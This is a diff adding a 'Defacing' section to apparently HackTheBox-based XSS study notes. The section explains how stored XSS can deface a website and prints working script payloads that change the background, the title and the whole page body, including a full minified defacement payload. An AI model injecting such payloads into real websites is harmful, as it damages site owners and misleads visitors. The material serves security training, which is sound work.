@@ -190,6 +190,60 @@ Although XSS is limited to browser execution, skilled attackers can escalate the
 
 ---
 
+# Defacing 
 
+#### Overview
+- **Definition**: Defacing changes the appearance of a website using malicious code, often for claiming a successful hack.
+- **Impact**: Such attacks can harm a company's reputation, investments, and share prices (e.g., NHS defacement in 2018).
+- **Stored XSS**: Commonly used for website defacing as payloads persist across user sessions.
 
+#### Key Elements for Defacement
+1. **Background Color** (`document.body.style.background` or `document.body.background`):
+   - Example payload for dark background:
+     ```html
+     <script>document.body.style.background = "#141d2b"</script>
+   ```
+   - Example payload for background image:
+     ```html
+     <script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
+   ```
+2. **Page Title** (`document.title`):
+   - Change title to display a custom message:
+     ```html
+     <script>document.title = 'HackTheBox Academy'</script>
+   ```
+3. **Page Text** (`DOM.innerHTML` or jQuery):
+   - Change specific text:
+     ```javascript
+     document.getElementById("todo").innerHTML = "New Text";
+     ```
+   - Change entire page body content:
+     ```javascript
+     document.getElementsByTagName('body')[0].innerHTML = "New Content";
+     ```
+
+#### Example Full Defacement
+- Custom HTML code for defacement:
+  ```html
+  <center>
+      <h1 style="color: white">Cyber Security Training</h1>
+      <p style="color: white">by 
+          <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
+      </p>
+  </center>
+  ```
+- Minified and added to the payload:
+  ```html
+  <script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"></p></center>'</script>
+  ```
+
+#### Execution
+- Injected payloads will:
+  - Change background color or image.
+  - Update the page title.
+  - Replace the entire page content with custom text or HTML.
+
+- Code execution happens when the malicious JavaScript runs in the browser, changing the page appearance for visitors.
+
+---
 
